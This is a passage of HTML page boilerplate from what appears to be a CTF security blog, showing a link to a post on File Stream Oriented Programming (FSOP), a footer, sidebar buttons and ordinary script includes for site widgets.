Programming (FSOP)"/></a><div class="content"><a class="title" href="/2026/01/14/Research/pwn/fsop/" title="Research: File Stream Oriented Programming (FSOP)">Research: File Stream Oriented Programming (FSOP)</a><time datetime="2026-01-14T02:31:32.000Z" title="Created 2026-01-14 09:31:32">2026-01-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/ctf/0xfun/poster.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>